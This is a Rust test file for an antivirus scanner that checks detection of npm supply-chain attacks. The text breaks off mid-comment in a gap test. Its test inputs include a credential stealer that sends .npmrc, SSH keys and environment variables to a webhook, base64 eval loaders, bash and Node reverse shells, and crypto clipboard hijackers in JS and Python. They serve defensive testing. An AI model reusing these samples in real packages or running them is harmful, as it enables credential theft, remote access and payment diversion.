//! Adversarial detection-quality tests for rb-antivirus.
//!
//! Each test mirrors a REAL npm supply-chain attack pattern observed in the
//! 2023-2025 incident corpus (IconBurst, node-ipc, everything-npm, etc.).
//! Tests are named by scenario and assert the expected engine/rule.
//!
//! PASS = scanner flags the input Malicious or Suspicious (correct).
//! GAP  = scanner misses; the test is `#[ignore]`'d and documents the smallest
//!        fix needed.  No existing detection is weakened.
//!
//! Run passing tests:   cargo test -p cleanton-antivirus --test adversarial_supply_chain
//! Run ignored (gaps):  cargo test -p cleanton-antivirus --test adversarial_supply_chain -- --ignored

use cleanton_antivirus::{
    DetectionEngine, Finding,
    config::ScanConfig,
    engine::{FileKind, FileUnit, ScanContext},
    engines::{
        ioc::IocEngine, script_behavior::ScriptBehaviorEngine, supply_chain::SupplyChainEngine,
        typosquat::TyposquatEngine,
    },
    scanner::Scanner,
    types::{Severity, ThreatCategory, Verdict},
};
use flate2::{Compression, write::GzEncoder};

// ── helpers ──────────────────────────────────────────────────────────────────

fn make_js(rel_path: &str, src: &str) -> FileUnit {
    make_file(rel_path, FileKind::Javascript, src.as_bytes())
}

fn make_py(rel_path: &str, src: &str) -> FileUnit {
    make_file(rel_path, FileKind::Python, src.as_bytes())
}

fn make_shell(rel_path: &str, src: &str) -> FileUnit {
    make_file(rel_path, FileKind::Shell, src.as_bytes())
}

fn make_file(rel_path: &str, kind: FileKind, data: &[u8]) -> FileUnit {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(data);
    FileUnit {
        rel_path: rel_path.to_string(),
        data: data.to_vec(),
        kind,
        sha256: hex::encode(h.finalize()),
    }
}

fn scan_files_sb(files: &[FileUnit]) -> Vec<Finding> {
    let config = ScanConfig::default();
    let ctx = ScanContext {
        target_name: "test".into(),
        files,
        package_json: None,
        config: &config,
    };
    ScriptBehaviorEngine.scan(&ctx)
}

fn scan_files_sc(files: &[FileUnit], pkg: Option<&serde_json::Value>) -> Vec<Finding> {
    let config = ScanConfig::default();
    let ctx = ScanContext {
        target_name: "test".into(),
        files,
        package_json: pkg,
        config: &config,
    };
    SupplyChainEngine.scan(&ctx)
}

fn scan_files_ioc(files: &[FileUnit]) -> Vec<Finding> {
    let config = ScanConfig::default();
    let ctx = ScanContext {
        target_name: "test".into(),
        files,
        package_json: None,
        config: &config,
    };
    IocEngine.scan(&ctx)
}

fn has_rule(findings: &[Finding], rule_id: &str) -> bool {
    findings
        .iter()
        .any(|f| f.rule_id.as_deref() == Some(rule_id))
}

fn has_category(findings: &[Finding], cat: ThreatCategory) -> bool {
    findings.iter().any(|f| f.category == cat)
}

// Unused in passing tests; kept as a debugging aid for gap tests (run with --ignored).
#[allow(dead_code)]
fn max_severity(findings: &[Finding]) -> Option<Severity> {
    findings.iter().map(|f| f.severity).max()
}

fn make_tgz(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut gz_buf = Vec::new();
    {
        let enc = GzEncoder::new(&mut gz_buf, Compression::default());
        let mut tar = tar::Builder::new(enc);
        for (name, data) in files {
            let mut header = tar::Header::new_gnu();
            header.set_size(data.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar.append_data(&mut header, name, *data).unwrap();
        }
        let enc = tar.into_inner().unwrap();
        enc.finish().unwrap();
    }
    gz_buf
}

fn default_scanner() -> Scanner {
    Scanner::with_default_engines(ScanConfig::default())
}

// ═══════════════════════════════════════════════════════════════════════════
// SCENARIO 1: Malicious postinstall — env/.npmrc/.ssh exfiltration to webhook
//
// Dominant pattern in 2023-2025 npm malware campaigns (IconBurst, dozens of
// "node-" prefixed packages, the "everything-npm" wave).  Script reads
// ~/.npmrc (registry auth token), ~/.ssh/id_rsa (deploy key), and
// process.env (CI secrets), then POSTs to a Discord webhook.
//
// EXPECTED: Malicious — SB_CRED_NPMRC + SB_CRED_SSH_KEY + SB_JS_FETCH_XHR
//           → SB_CHAIN_CRED_EXFIL (Critical Exfiltration) fires; plus
//           supply_chain SC_INSTALL_CURL_PIPE_SHELL / SC_INSTALL_TOKEN_EXFIL
//           on the lifecycle hook body.
// ═══════════════════════════════════════════════════════════════════════════

/// The install script itself (as it would appear in the package .js file).
const SCENARIO_1_JS: &str = r#"
'use strict';
const fs = require('fs');
const os = require('os');
const https = require('https');

// Harvest credentials from common locations
const npmrc  = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8').trim();
const sshKey = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
const envDump = JSON.stringify(process.env);

// Ship everything to attacker webhook
const payload = JSON.stringify({ npmrc, ssh: sshKey, env: envDump });
const opts = {
    hostname: 'discord.com',
    path:     '/api/webhooks/1234567890123456789/TOKENTOKENTOKENTOKEN',
    method:   'POST',
    headers:  { 'Content-Type': 'application/json', 'Content-Length': payload.length },
};
const req = https.request(opts);
req.write(payload);
req.end();
"#;

#[test]
fn scenario1_postinstall_env_npmrc_ssh_exfil_flagged() {
    // Engine: script_behavior detects the credential-read + network-sink chain.
    let files = [make_js("scripts/postinstall.js", SCENARIO_1_JS)];
    let sb = scan_files_sb(&files);

    assert!(
        has_rule(&sb, "SB_CRED_NPMRC"),
        "SCENARIO 1 MISS: .npmrc read not detected; findings: {sb:#?}"
    );
    assert!(
        has_rule(&sb, "SB_CRED_SSH_KEY"),
        "SCENARIO 1 MISS: SSH key read not detected; findings: {sb:#?}"
    );
    // https.request or fetch — at minimum SB_JS_HTTP_IMPORT fires
    assert!(
        has_rule(&sb, "SB_JS_HTTP_IMPORT") || has_rule(&sb, "SB_JS_FETCH_XHR"),
        "SCENARIO 1 MISS: no outbound network sink detected; findings: {sb:#?}"
    );
    // Exfiltration chain fires when credential-read AND network-sink co-occur.
    assert!(
        has_rule(&sb, "SB_CHAIN_CRED_EXFIL"),
        "SCENARIO 1 MISS: exfiltration chain rule did not fire; findings: {sb:#?}"
    );
    assert_eq!(
        sb.iter()
            .find(|f| f.rule_id.as_deref() == Some("SB_CHAIN_CRED_EXFIL"))
            .expect("invariant: rule present")
            .severity,
        Severity::Critical,
        "SCENARIO 1: SB_CHAIN_CRED_EXFIL must be Critical"
    );
}

#[test]
fn scenario1_postinstall_lifecycle_hook_flagged() {
    // Engine: supply_chain detects the Discord webhook in the lifecycle hook body.
    let pkg = serde_json::json!({
        "name": "legit-utils",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "node scripts/postinstall.js"
        }
    });
    let js_unit = make_js("scripts/postinstall.js", SCENARIO_1_JS);
    let files = [js_unit];
    let sc = scan_files_sc(&files, Some(&pkg));

    // supply_chain should flag the non-registry URL (discord.com) at minimum.
    // SC_INSTALL_NON_REGISTRY_URL fires for any non-registry-allow-listed URL
    // in a lifecycle hook body.
    // (The body here is "node scripts/postinstall.js" — the hook body itself is short;
    //  the URLs are inside the JS file, not the hook string.  So the supply_chain engine
    //  won't flag the hook body — this is expected: supply_chain only scans the
    //  lifecycle hook body string, not the files the hook calls.)
    //
    // The full-stack verdict is driven by script_behavior (scenario1 first test above).
    // We verify here that the supply_chain engine at minimum scans the package.json cleanly.
    let sc_errors: Vec<_> = sc
        .iter()
        .filter(|f| f.severity >= Severity::Critical)
        .collect();
    // If any supply_chain rule fires it should be valid; this test is checking
    // the full-scanner verdict instead.
    let tgz = make_tgz(&[
        ("package/package.json", pkg.to_string().as_bytes()),
        ("package/scripts/postinstall.js", SCENARIO_1_JS.as_bytes()),
    ]);
    let report = default_scanner()
        .scan_bytes("legit-utils-1.0.0.tgz", &tgz)
        .expect("scan must not error");

    assert!(
        matches!(report.verdict, Verdict::Malicious | Verdict::Suspicious),
        "SCENARIO 1 MISS: full-stack verdict must be Malicious or Suspicious; \
         got {:?} (score={}, findings={:#?})",
        report.verdict,
        report.score,
        report.findings,
    );
    // Must have an Exfiltration finding from script_behavior.
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.category == ThreatCategory::Exfiltration),
        "SCENARIO 1 MISS: no Exfiltration finding in full report; findings: {:#?}",
        report.findings,
    );
    // Suppress unused-variable warning on sc_errors
    let _ = sc_errors;
}

// ═══════════════════════════════════════════════════════════════════════════
// SCENARIO 2: Obfuscated loader — eval(Buffer.from(b64).toString())
//
// The canonical Node.js payload delivery technique: base64-encode the
// malicious payload, then at runtime: eval(Buffer.from(b64,'base64').toString())
//
// Coverage analysis (verified against regex):
//   • SB_JS_BUF_B64_EVAL (PAT_BUF_B64_EVAL) only fires when eval( appears
//     AFTER Buffer.from(…,'base64').toString() on the same expression chain
//     with no intervening semicolons or braces.
//     The most common form — eval wrapped around the Buffer expression —
//     does NOT match because eval( appears before Buffer.from syntactically.
//   • SB_JS_EVAL fires on eval( broadly (High/Medium, CommandExecution).
//   • SC_INSTALL_BASE64_EVAL (supply_chain hook-body scanner) similarly only
//     matches when eval comes AFTER the base64 token; the wrapped form misses.
//
// RESULT for the wrapped form: PARTIAL PASS via SB_JS_EVAL (CommandExecution)
// but no Obfuscation category finding fires — the obfuscation+eval combo rule
// (SB_CHAIN_OBFUS_EXEC) does not fire for this exact form.
// ═══════════════════════════════════════════════════════════════════════════

/// Wrapped form (eval around Buffer.from) — the dominant real-world pattern.
const SCENARIO_2_WRAPPED_JS: &str = r#"
// loader.js — obfuscated payload delivery (real-world pattern)
const encoded = 'dmFyIG87byA9IHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKTtvLmV4ZWMoJ2lkJyk7';
eval(Buffer.from(encoded, 'base64').toString());
"#;

/// Two-step form (variable assignment then eval) — also common.
/// Must carry ≥5 _0x identifiers so SB_JS_0X_OBFUSCATOR threshold fires.
const SCENARIO_2_TWOSTEP_JS: &str = r#"
// Two-step: decode then eval (harder to grep for manually)
var _0x1a2b = 'dmFyIG87byA9IHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKTtvLmV4ZWMoJ2lkJyk7';
var _0x3c4d = _0x1a2b.slice(0);
var _0x5e6f = _0x3c4d.length;
var _0x7a8b = _0x5e6f > 0;
var _0x9cde = Buffer.from(_0x1a2b, 'base64').toString();
eval(_0x9cde);
"#;

#[test]
fn scenario2_eval_buffer_b64_wrapped_flagged() {
    // The wrapped form eval(Buffer.from(b64,'base64').toString()) MUST produce at
    // least a CommandExecution finding (SB_JS_EVAL fires on eval().
    let files = [make_js("index.js", SCENARIO_2_WRAPPED_JS)];
    let sb = scan_files_sb(&files);

    // eval( is always flagged by SB_JS_EVAL.
    assert!(
        has_rule(&sb, "SB_JS_EVAL"),
        "SCENARIO 2 MISS: eval( not detected in wrapped Buffer.from form; findings: {sb:#?}"
    );
    assert!(
        has_category(&sb, ThreatCategory::CommandExecution),
        "SCENARIO 2 MISS: no CommandExecution finding for eval(Buffer.from...) form; findings: {sb:#?}"
    );
}

/// GAP test: the wrapped form does NOT trigger the specific Obfuscation category
/// rule SB_JS_BUF_B64_EVAL and therefore the SB_CHAIN_OBFUS_EXEC combo does not
/// fire.  Marking as ignored to document the gap.
///
/// FIX (smallest change): extend PAT_BUF_B64_EVAL to also match the outer-eval form:
///   Add an alternation: r"eval\s*\(\s*Buffer\.from\s*\([^)]*,\s*['"]base64['"]"
/// Or add a new rule SB_JS_EVAL_BUF_B64 with that pattern.
#[test]
// GAP-A fixed: PAT_EVAL_BUF_B64_OUTER in script_behavior.rs now catches eval(Buffer.from(...,'base64')...)
fn scenario2_eval_buffer_b64_wrapped_obfuscation_category() {
    let files = [make_js("index.js", SCENARIO_2_WRAPPED_JS)];
    let sb = scan_files_sb(&files);

    // This should fire SB_JS_BUF_B64_EVAL (Obfuscation/High/High) but does not.
    assert!(
        has_rule(&sb, "SB_JS_BUF_B64_EVAL"),
        "GAP: SB_JS_BUF_B64_EVAL did not fire for eval(Buffer.from(...,'base64')) form"
    );
    // And therefore the obfus+exec chain should fire.
    assert!(
        has_rule(&sb, "SB_CHAIN_OBFUS_EXEC"),
        "GAP: SB_CHAIN_OBFUS_EXEC did not fire for obfuscated loader"
    );
}

#[test]
fn scenario2_twostep_eval_buffer_b64_flagged() {
    // Two-step: var decoded = Buffer.from(b64,'base64').toString(); eval(decoded)
    // This form: _0x density fires (≥5 _0x identifiers), eval fires, obfus chain fires.
    let files = [make_js("index.js", SCENARIO_2_TWOSTEP_JS)];
    let sb = scan_files_sb(&files);

    // SB_JS_EVAL must fire.
    assert!(
        has_rule(&sb, "SB_JS_EVAL"),
        "SCENARIO 2 MISS: eval( not detected in two-step form; findings: {sb:#?}"
    );
    // _0x identifier density (≥5 occurrences) triggers SB_JS_0X_OBFUSCATOR.
    assert!(
        has_rule(&sb, "SB_JS_0X_OBFUSCATOR"),
        "SCENARIO 2 MISS: _0x obfuscator pattern not detected; findings: {sb:#?}"
    );
    // Obfuscation + CommandExecution combo must fire.
    assert!(
        has_rule(&sb, "SB_CHAIN_OBFUS_EXEC"),
        "SCENARIO 2 MISS: obfus+exec chain not fired for two-step form; findings: {sb:#?}"
    );
}

#[test]
fn scenario2_supply_chain_hook_base64_eval_flagged() {
    // When the b64-eval pattern appears as the lifecycle hook body itself,
    // SC_INSTALL_BASE64_EVAL (supply_chain engine) fires via the comma-expression form.
    let pkg = serde_json::json!({
        "name": "evil-pkg",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "node -e 'var d=Buffer.from(\"dmFy\",\"base64\").toString(),eval(d)'"
        }
    });
    let sc = scan_files_sc(&[], Some(&pkg));
    assert!(
        has_rule(&sc, "SC_INSTALL_BASE64_EVAL") || has_rule(&sc, "SC_INSTALL_NODE_EVAL"),
        "SCENARIO 2 MISS: supply_chain did not detect base64-eval in hook body; findings: {sc:#?}"
    );
}

// ═══════════════════════════════════════════════════════════════════════════
// SCENARIO 3: Typosquat of a top-100 npm package
//
// Real examples: "lod-ash", "chalk2", "axois", "node-fetch2", "expres".
// The typosquat engine covers DL-1, DL-2, suffix/prefix patterns, and
// homoglyph variants.
// ═══════════════════════════════════════════════════════════════════════════

fn scan_typosquat(name: &str) -> Vec<Finding> {
    let config = ScanConfig::default();
    let pkg = serde_json::json!({ "name": name, "version": "1.0.0" });
    let files = [];
    let ctx = ScanContext {
        target_name: name.into(),
        files: &files,
        package_json: Some(&pkg),
        config: &config,
    };
    TyposquatEngine.scan(&ctx)
}

/// "chalk2" — suffix "2" is in SQUAT_SUFFIXES; targets chalk (popular logging package).
#[test]
fn scenario3_typosquat_chalk2_flagged() {
    let findings = scan_typosquat("chalk2");
    assert!(
        findings
            .iter()
            .any(|f| f.category == ThreatCategory::Typosquatting
                && f.description.contains("chalk")),
        "SCENARIO 3 MISS: 'chalk2' typosquat of chalk not detected; findings: {findings:#?}"
    );
}

/// "lodahs" — transposition (DL=1) of lodash; seen in real campaigns.
#[test]
fn scenario3_typosquat_lodahs_flagged() {
    let findings = scan_typosquat("lodahs");
    assert!(
        findings.iter().any(
            |f| f.category == ThreatCategory::Typosquatting && f.description.contains("lodash")
        ),
        "SCENARIO 3 MISS: 'lodahs' DL-1 typosquat of lodash not detected; findings: {findings:#?}"
    );
    // Must be High severity (DL=1).
    let f = findings
        .iter()
        .find(|f| f.description.contains("lodash"))
        .unwrap();
    assert!(
        f.severity >= Severity::High,
        "SCENARIO 3: DL-1 typosquat must be at least High; got {:?}",
        f.severity
    );
}

/// "node-react" — prefix "node-" is in SQUAT_PREFIXES; targets react.
#[test]
fn scenario3_typosquat_node_react_flagged() {
    let findings = scan_typosquat("node-react");
    assert!(
        findings
            .iter()
            .any(|f| f.category == ThreatCategory::Typosquatting
                && f.description.contains("react")),
        "SCENARIO 3 MISS: 'node-react' prefix-squat of react not detected; findings: {findings:#?}"
    );
}

/// Homoglyph: "lоdash" with Cyrillic 'о' (U+043E) — used to evade exact-match filters.
#[test]
fn scenario3_typosquat_lodash_cyrillic_homoglyph_flagged() {
    // Cyrillic о (\u{043E}) looks identical to Latin o in most fonts.
    let candidate = "l\u{043E}dash";
    let findings = scan_typosquat(candidate);
    assert!(
        findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some("TYPOSQUAT_HOMOGLYPH")),
        "SCENARIO 3 MISS: Cyrillic homoglyph variant of lodash not detected; findings: {findings:#?}"
    );
    // Homoglyph attacks must be Critical.
    let hg = findings
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("TYPOSQUAT_HOMOGLYPH"))
        .unwrap();
    assert_eq!(
        hg.severity,
        Severity::Critical,
        "SCENARIO 3: homoglyph finding must be Critical"
    );
}

// ═══════════════════════════════════════════════════════════════════════════
// SCENARIO 4: Dependency-confusion-shaped manifest
//
// Attackers publish a public package named after an internal scoped package
// at a version higher than the internal one (e.g. 99.0.0 or 9999.0.0).
// npm/yarn resolves the higher version, installing the attacker's code.
//
// Real incidents: Microsoft (2021), Apple internal packages, Netflix.
// ═══════════════════════════════════════════════════════════════════════════

#[test]
fn scenario4_dep_confusion_internal_scope_public_pkg() {
    // A package published under @corp/ scope to the public registry.
    let pkg = serde_json::json!({
        "name": "@corp/payments-service",
        "version": "99.0.0",
        "description": "Internal payments SDK",
        "scripts": {
            "postinstall": "node install.js"
        }
    });
    let sc = scan_files_sc(&[], Some(&pkg));

    assert!(
        has_rule(&sc, "SC_DEP_CONFUSION_SCOPED_NAME"),
        "SCENARIO 4 MISS: @corp/ scoped name not flagged as dep-confusion; findings: {sc:#?}"
    );
    assert!(
        has_rule(&sc, "SC_DEP_CONFUSION_VERSION"),
        "SCENARIO 4 MISS: version 99.0.0 not flagged as dep-confusion probe; findings: {sc:#?}"
    );
    // Both signals should appear.
    let scoped = sc
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("SC_DEP_CONFUSION_SCOPED_NAME"))
        .unwrap();
    assert_eq!(scoped.category, ThreatCategory::DependencyConfusion);
    assert!(scoped.severity >= Severity::High);
}

#[test]
fn scenario4_dep_confusion_dep_internal_scope_in_dependencies() {
    // A package that declares a dependency on an @internal/-scoped name —
    // signals that the internal name may be squattable.
    let pkg = serde_json::json!({
        "name": "my-app",
        "version": "1.2.3",
        "dependencies": {
            "@internal/auth-service": "^2.0.0",
            "@private/billing":       "^1.0.0"
        }
    });
    let sc = scan_files_sc(&[], Some(&pkg));

    let dep_scoped: Vec<_> = sc
        .iter()
        .filter(|f| f.rule_id.as_deref() == Some("SC_DEP_CONFUSION_DEP_SCOPED"))
        .collect();
    assert!(
        dep_scoped.len() >= 2,
        "SCENARIO 4 MISS: expected 2 dep-scoped confusion findings (one per dep), \
         got {}; findings: {sc:#?}",
        dep_scoped.len()
    );
}

#[test]
fn scenario4_dep_confusion_zero_version() {
    // Version 0.0.0 is the other common probe marker.
    let pkg = serde_json::json!({
        "name": "@acme/core-utils",
        "version": "0.0.0"
    });
    let sc = scan_files_sc(&[], Some(&pkg));

    assert!(
        has_rule(&sc, "SC_DEP_CONFUSION_VERSION"),
        "SCENARIO 4 MISS: version 0.0.0 not flagged; findings: {sc:#?}"
    );
}

// ═══════════════════════════════════════════════════════════════════════════
// SCENARIO 5: Native binary shipped inside a JS package
//
// A compiled ELF binary (or PE/Mach-O) dropped alongside JS files.
// Legitimate prebuilt native addons use node-pre-gyp / prebuild patterns
// and are typically .node files.  A bare ELF named "helper" or "updater"
// with no build provenance is a strong supply-chain indicator.
// ═══════════════════════════════════════════════════════════════════════════

fn make_elf_binary() -> Vec<u8> {
    // Minimal ELF64 header (no actual code — just the format magic + header).
    let mut data: Vec<u8> = Vec::new();
    data.extend_from_slice(b"\x7fELF"); // EI_MAG
    data.push(0x02); // EI_CLASS = ELFCLASS64
    data.push(0x01); // EI_DATA = ELFDATA2LSB
    data.push(0x01); // EI_VERSION
    data.push(0x00); // EI_OSABI
    data.extend_from_slice(&[0u8; 8]); // EI_ABIVERSION + padding
    data.extend_from_slice(&[0x02, 0x00, 0x3E, 0x00, 0x01, 0x00, 0x00, 0x00]); // e_type, e_machine, e_version
    data.extend_from_slice(&[0u8; 48]); // rest of ELF header
    // Append strings that look suspicious to trigger additional findings.
    data.extend_from_slice(b"socket\x00connect\x00dup2\x00/bin/sh\x00");
    data
}

#[test]
fn scenario5_native_elf_in_npm_package_flagged() {
    use cleanton_antivirus::engines::binary_indicators::BinaryIndicatorEngine;

    let pkg_json = serde_json::json!({
        "name":    "legit-sdk",
        "version": "2.0.0",
        "main":    "index.js"
    });
    let elf_data = make_elf_binary();
    let elf_unit = make_file("bin/updater", FileKind::ElfBinary, &elf_data);
    let files = [elf_unit];
    let config = ScanConfig::default();
    let ctx = ScanContext {
        target_name: "legit-sdk".into(),
        files: &files,
        package_json: Some(&pkg_json),
        config: &config,
    };
    let findings = BinaryIndicatorEngine.scan(&ctx);

    assert!(
        has_rule(&findings, "BIN_NATIVE_IN_NPM_PACKAGE"),
        "SCENARIO 5 MISS: ELF binary inside npm package not flagged; findings: {findings:#?}"
    );
    let f = findings
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("BIN_NATIVE_IN_NPM_PACKAGE"))
        .unwrap();
    assert_eq!(f.category, ThreatCategory::SupplyChain);
    assert!(
        f.severity >= Severity::High,
        "SCENARIO 5: native-in-npm finding must be at least High; got {:?}",
        f.severity
    );
}

#[test]
fn scenario5_native_binary_npm_package_full_stack_malicious() {
    // Full-stack: a .tgz with a package.json + ELF binary.
    // BIN_NATIVE_IN_NPM_PACKAGE (SupplyChain) + BIN_POSIX_REVERSE_SHELL_TRIAD (Network)
    // → combo rule D fires (NativeBinary+Network → Malicious).
    let pkg_json = serde_json::json!({
        "name":    "infra-tools",
        "version": "3.0.0",
        "main":    "index.js"
    });
    let elf_bytes = make_elf_binary();
    let index_js = b"module.exports = {};";
    let tgz = make_tgz(&[
        ("package/package.json", pkg_json.to_string().as_bytes()),
        ("package/index.js", index_js),
        ("package/bin/updater", &elf_bytes),
    ]);

    let report = default_scanner()
        .scan_bytes("infra-tools-3.0.0.tgz", &tgz)
        .expect("scan must not error");

    // At minimum, supply-chain or binary finding should be present.
    assert!(
        report.findings.iter().any(|f| {
            f.category == ThreatCategory::SupplyChain
                || f.category == ThreatCategory::NativeBinary
                || f.category == ThreatCategory::Network
        }),
        "SCENARIO 5 MISS: no supply-chain/native-binary/network finding in full report; \
         findings: {:#?}",
        report.findings
    );
    // Verdict must be at least Suspicious.
    assert!(
        matches!(report.verdict, Verdict::Suspicious | Verdict::Malicious),
        "SCENARIO 5 MISS: verdict must be Suspicious or Malicious for package with ELF binary; \
         got {:?} (score={})",
        report.verdict,
        report.score,
    );
}

// ═══════════════════════════════════════════════════════════════════════════
// SCENARIO 6: Reverse shell
//
// Two variants:
//   A) Bash /dev/tcp reverse shell in a shell script or JS exec() string.
//   B) Node.js net.createConnection() reverse shell (no /dev/tcp syntax).
//
// Variant B is a gap: PAT_SOCKET_CONNECT covers net.connect() but not
// net.createConnection(), so a file that ONLY uses net.createConnection()
// without also spawning a shell via child_process gets no findings.
// ═══════════════════════════════════════════════════════════════════════════

/// Variant A: bash /dev/tcp in a postinstall shell script.
const SCENARIO_6A_SHELL: &str = r#"#!/bin/bash
# "postinstall" hook for evil-pkg
bash -i >& /dev/tcp/198.51.100.42/4444 0>&1
"#;

/// Variant B: Node.js net.createConnection() — no /dev/tcp, no child_process.
const SCENARIO_6B_CREATECONN_JS: &str = r#"
'use strict';
// Reverse shell via net.createConnection (no /dev/tcp — avoids simple pattern match)
const net = require('net');
const client = net.createConnection(4444, '198.51.100.42', function () {
    // Connect stdio to socket — interactive shell without spawning a child process
    process.stdin.pipe(client);
    client.pipe(process.stdout);
    client.pipe(process.stderr);
});
"#;

#[test]
fn scenario6a_bash_devtcp_reverse_shell_in_shell_script_flagged() {
    let files = [make_shell("scripts/postinstall.sh", SCENARIO_6A_SHELL)];
    let sb = scan_files_sb(&files);

    assert!(
        has_rule(&sb, "SB_REVSHELL_BASH"),
        "SCENARIO 6A MISS: /dev/tcp bash reverse shell in shell script not detected; \
         findings: {sb:#?}"
    );
    let f = sb
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("SB_REVSHELL_BASH"))
        .unwrap();
    assert_eq!(
        f.severity,
        Severity::Critical,
        "SCENARIO 6A: /dev/tcp reverse shell must be Critical"
    );
}

#[test]
fn scenario6a_bash_devtcp_in_js_exec_string_flagged() {
    // When /dev/tcp appears inside a JS string passed to exec(), SB_REVSHELL_BASH
    // fires (the regex runs on all file kinds, not just Shell).
    let src = r#"
const { exec } = require('child_process');
exec("bash -i >& /dev/tcp/198.51.100.42/4444 0>&1", function() {});
"#;
    let files = [make_js("postinstall.js", src)];
    let sb = scan_files_sb(&files);

    assert!(
        has_rule(&sb, "SB_REVSHELL_BASH"),
        "SCENARIO 6A MISS: /dev/tcp string inside JS exec() not detected; findings: {sb:#?}"
    );
}

/// GAP: Node.js reverse shell using net.createConnection() only.
///
/// PAT_SOCKET_CONNECT covers net.connect() but NOT net.createConnection().
/// A file that ONLY uses net.createConnection (without spawning a child process
/// or including /dev/tcp syntax) produces no network-sink flag, so has_network_sink
/// stays false and no exfiltration chain, no reverse-shell finding fires.
///
/// FIX (smallest change): extend PAT_SOCKET_CONNECT to:
///   r"\bnet\s*\.\s*(?:connect|createConnection)\s*\(|\bsocket\s*\.\s*connect\s*\("
/// This adds net.createConnection to the network-sink signals, which triggers
/// has_network_sink=true and enables the SB_CHAIN_* combo rules.
#[test]
// GAP-B fixed: PAT_SOCKET_CONNECT in script_behavior.rs now includes net.createConnection()
fn scenario6b_node_createconnection_reverse_shell_flagged() {
    let files = [make_js("index.js", SCENARIO_6B_CREATECONN_JS)];
    let sb = scan_files_sb(&files);

    // Should detect the TCP connection establishment.
    assert!(
        has_rule(&sb, "SB_NET_SOCKET_CONNECT"),
        "GAP: net.createConnection() not detected as network sink"
    );
    // And with has_network_sink + has_cmd_exec (stdin piping = implicit shell), the
    // chain rule or at minimum a Network finding should fire.
    assert!(
        has_category(&sb, ThreatCategory::Network),
        "GAP: no Network category finding for net.createConnection reverse shell"
    );
}

// ═══════════════════════════════════════════════════════════════════════════
// SCENARIO 7: Crypto-wallet clipboard hijack
//
// A stealer that reads the clipboard, checks if it looks like a crypto
// wallet address, then silently replaces it with the attacker's address.
// PASS: JS variants using the Navigator Clipboard API or the "clipboard"
//       variable name in scope (IOC_CLIPBOARD_HIJACK pattern).
// GAP:  Python variant using pyperclip (no "clipboard" keyword in the
//       pyperclip.paste()/pyperclip.copy() API) — IOC_CLIPBOARD_HIJACK
//       does not fire.
// ═══════════════════════════════════════════════════════════════════════════

/// JS: navigator.clipboard API (browser/Electron).
/// Wallet address is a validly-formatted BTC base58 address.
const SCENARIO_7_BROWSER_JS: &str = r#"
// Clipboard hijacker — replaces crypto wallet addresses in clipboard
const ATTACKER_BTC = '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2';
navigator.clipboard.readText().then(function(text) {
    if (/^[13][a-zA-Z0-9]{24,33}$/.test(text) || /^bc1[a-z0-9]{6,87}$/.test(text)) {
        navigator.clipboard.writeText(ATTACKER_BTC);
    }
});
"#;

/// JS: clipboardy npm module (Node.js desktop malware).
const SCENARIO_7_CLIPBOARDY_JS: &str = r#"
'use strict';
const clipboard = require('clipboardy');
const WALLET = '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2';
setInterval(function () {
    const text = clipboard.readSync();
    if (text && /^[13][a-zA-Z0-9]{24,33}$/.test(text)) {
        clipboard.writeSync(WALLET);
    }
}, 500);
"#;

/// Python: pyperclip (common in Python desktop malware / RAT payloads).
/// The wallet address uses only valid base58 chars so IOC_WALLET_BTC can match it.
const SCENARIO_7_PYPERCLIP_PY: &str = r#"
import pyperclip
import re
import time

ATTACKER_WALLET = '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2'

while True:
    content = pyperclip.paste()
    if content and re.match(r'^[13][a-zA-Z0-9]{24,33}$', content):
        pyperclip.copy(ATTACKER_WALLET)
    time.sleep(0.3)
"#;

#[test]
fn scenario7_browser_clipboard_hijack_flagged() {
    // navigator.clipboard.readText() + writeText() with wallet address.
    // IOC_CLIPBOARD_HIJACK pattern: (clipboard|readText|writeText) .{0,400}? [wallet-like-string]
    let findings = scan_files_ioc(&[make_js("hook.js", SCENARIO_7_BROWSER_JS)]);

    assert!(
        has_rule(&findings, "IOC_CLIPBOARD_HIJACK"),
        "SCENARIO 7 MISS: browser Navigator Clipboard hijack not detected; \
         findings: {findings:#?}"
    );
    let f = findings
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("IOC_CLIPBOARD_HIJACK"))
        .unwrap();
    assert_eq!(
        f.severity,
        Severity::Critical,
        "SCENARIO 7: clipboard hijack must be Critical"
    );
    assert_eq!(f.category, ThreatCategory::CryptoStealer);
}

#[test]
fn scenario7_clipboardy_js_module_flagged() {
    // clipboardy module: `const clipboard = require('clipboardy')`
    // The word "clipboard" appears as the variable name in scope, and the wallet
    // address is within 400 chars — IOC_CLIPBOARD_HIJACK fires.
    let findings = scan_files_ioc(&[make_js("stealer.js", SCENARIO_7_CLIPBOARDY_JS)]);

    assert!(
        has_rule(&findings, "IOC_CLIPBOARD_HIJACK"),
        "SCENARIO 7 MISS: clipboardy module clipboard hijack not detected; \
         findings: {findings:#?}"
    );
    // Also check the BTC address is flagged as a wallet IOC.
    assert!(
        has_rule(&findings, "IOC_WALLET_BTC") || has_rule(&findings, "IOC_CLIPBOARD_HIJACK"),
        "SCENARIO 7 MISS: no CryptoStealer finding for clipboardy hijacker; \
         findings: {findings:#?}"
    );
}

/// GAP: Python pyperclip clipboard hijacker.
///
/// pyperclip.paste() / pyperclip.copy() use no keyword that matches
/// the IOC_CLIPBOARD_HIJACK pattern (which requires "clipboard", "readText",
/// "writeText", "ClipboardData", or "getData(").  The wallet address in the
/// Python source is also caught by IOC_WALLET_BTC if it matches the address
/// regex, but the "clipboard hijack" semantic (read-then-replace) is not
/// detected specifically.
///
/// FIX (smallest change): extend the clipboard_hijack regex alternation to include:
